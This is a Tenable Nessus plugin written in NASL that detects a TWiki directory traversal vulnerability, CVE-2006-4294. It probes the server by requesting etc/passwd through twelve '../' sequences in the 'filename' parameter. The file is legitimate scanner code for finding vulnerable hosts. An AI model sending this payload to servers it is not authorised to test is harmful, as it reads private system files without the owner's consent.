#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(22362);
  script_version("1.17");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-4294");
  script_bugtraq_id(19907);

  script_name(english:"TWiki 'filename' Parameter Traversal Arbitrary File Access");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a Perl script that is affected by a
directory traversal attack.");
  script_set_attribute(attribute:"description", value:
"The version of TWiki running on the remote host allows directory
traversal sequences in the 'filename' parameter in the viewfile()
function of 'lib/TWiki/UI/View.pm'. An unauthenticated attacker can 
exploit this issue to view arbitrary files on the remote host subject
to the privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2006-4294");
  script_set_attribute(attribute:"solution", value:
"Apply Hotfix 3 for TWiki-4.0.4.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/09/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/09/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:twiki:twiki");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("twiki_detect.nasl");
  script_require_keys("installed_sw/TWiki");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "TWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

dir = ereg_replace(pattern:"(/[^/]+/).*", string:dir, replace:"\1");

if ("cgi-bin" >!< dir)
{
  dir = ereg_replace(pattern:"(/[^/]+/).*", string:dir, replace:"\1");
  dir = dir + "bin/";
}
else
  dir = dir - "view";

# Try to exploit the flaw to read a file.
file = mult_str(str:"../", nb:12) + "etc/passwd";
path = "file/TWiki/TWikiDocGraphics?filename=";

res = http_send_recv3(
  method   : "GET",
  port     : port,
  item     : dir + path + file,
  exit_on_fail : TRUE
);

# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res[2]))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : "etc/passwd",
    request     : install_url + path + file,
    output      : chomp(res[2]),
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
